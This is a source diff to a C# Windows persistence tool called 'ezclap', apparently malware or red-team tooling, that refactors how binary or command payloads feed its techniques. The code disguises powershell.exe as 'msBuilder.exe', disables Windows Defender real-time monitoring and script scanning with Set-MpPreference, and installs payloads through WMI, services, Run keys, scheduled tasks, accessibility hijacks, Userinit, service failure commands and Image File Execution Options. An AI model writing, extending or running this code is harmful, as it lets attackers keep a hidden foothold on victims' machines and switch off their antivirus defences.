@@ -25,7 +25,13 @@ namespace ezclap
 {
     class Program
     {
-
+        public static void copyPayload(string originPayloadLoc, string[] newLoc)
+        {
+            foreach (var destination in newLoc)
+            {
+                System.IO.File.Copy(originPayloadLoc, destination, true);
+            }
+        }
         /*
          *  Name: setup 
          *  Description: Basic setup script which performs various tasks 
@@ -41,7 +47,7 @@ namespace ezclap
          *      - (string[]) newLoc - Destination location which the original payloads will be copied to 
          * 
          */
-        public static void setup(string originPayloadLoc, string[] newLoc)
+        public static void setup(bool binary, string originPayloadLoc, string[] newLoc)
         {
             // 1. Copy powershell as msBuilder.exe 
             string srcPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
@@ -53,10 +59,8 @@ namespace ezclap
             //Console.WriteLine(RegistryKeys.hklmImagePath);
 
             // 3. Copy payload into different locations 
-            foreach (var destination in newLoc)
-            {
-                System.IO.File.Copy(originPayloadLoc, destination, true);
-            }
+            if (binary == true)
+                copyPayload(originPayloadLoc, newLoc);
 
             // 4. Disable WinDefender - Temp 
             string noRealTime = "Set-MpPreference -DisableRealTimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true";
@@ -190,12 +194,21 @@ namespace ezclap
 
             var binaryPayloadArr = binaryPayload.ToArray();
             var commandPayloadArr = commandPayload.ToArray();
+            var payloadArr = new string[0];
 
-            if(binary == true){
+            // Setup before the persist techniques 
+            if (binary == true)
+            {
                 Console.WriteLine("[+] Binary payload selected");
-                setup(originalPayloadLoc, binaryPayloadArr);
+                setup(binary, originalPayloadLoc, binaryPayloadArr);
+                payloadArr = binaryPayloadArr;
             }
-            
+            else
+            {
+                payloadArr = commandPayloadArr;
+                setup(binary, "", new string[0]);
+            }
+
 
             // Actually Execute Persistence techniques 
             foreach (var technique in techniques)
@@ -204,19 +217,19 @@ namespace ezclap
                 {
                     var WMIName = Utils.parseConfig("techniques/AddWMI", "name").ToArray();
                     Array.ForEach(WMIName, element => Console.WriteLine(element));
-                    AddWMI persistWMI = new AddWMI(WMIName, binaryPayloadArr);
+                    AddWMI persistWMI = new AddWMI(WMIName, payloadArr);
                 }
 
                 if(technique == "service")
                 {
                     var serviceName = Utils.parseConfig("techniques/AddService", "name").ToArray();
-                    AddService persistService = new AddService(serviceName, binaryPayloadArr);
+                    AddService persistService = new AddService(serviceName, payloadArr);
                 }
 
                 if(technique == "runkey")
                 {
                     string[] runKeyName = Utils.parseConfig("techniques/AddRunKey", "name").ToArray();
-                    AddRunKey persistRunKey = new AddRunKey(runKeyName, binaryPayloadArr[rnd.Next(0, binaryPayloadArr.Length - 1)]);
+                    AddRunKey persistRunKey = new AddRunKey(runKeyName, payloadArr[rnd.Next(0, payloadArr.Length - 1)]);
                 }
 
                 if(technique == "user")
@@ -232,31 +245,31 @@ namespace ezclap
                     string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name").ToArray(); ;
                     string[] intervalString = Utils.parseConfig("techniques/AddScheduledTask", "interval").ToArray(); ;
                     double interval = Convert.ToDouble(intervalString[0]);
-                    AddScheduledTask persistSchTask = new AddScheduledTask(scheduledTaskName, binaryPayloadArr, interval);
+                    AddScheduledTask persistSchTask = new AddScheduledTask(scheduledTaskName, payloadArr, interval);
                 }
 
                 if(technique == "access")
                 {
-                    AddAccessibility persistAccessibility = new AddAccessibility(binaryPayloadArr);
+                    AddAccessibility persistAccessibility = new AddAccessibility(payloadArr);
                 }
 
                 if(technique == "userinit")
                 {
-                    Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", binaryPayloadArr[rnd.Next(0, binaryPayloadArr.Length - 1)] + ", C:\\Windows\\System32\\userinit.exe");
+                    Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payloadArr[rnd.Next(0, payloadArr.Length - 1)] + ", C:\\Windows\\System32\\userinit.exe");
                 }
 
                 if(technique == "failure")
                 {
                     List<string> servicesList = Utils.getAllServices();
-                    AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, binaryPayloadArr);
+                    AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, payloadArr);
                 }
 
                 if(technique == "imagefile")
                 {
-                    modifyImageFileExec(binaryPayloadArr);
+                    modifyImageFileExec(payloadArr);
                 }
 
-                System.IO.File.Delete(originalPayloadLoc);
+                //System.IO.File.Delete(originalPayloadLoc);
 
                 Console.WriteLine("[+] All persistence mechanisms are done.");
             }
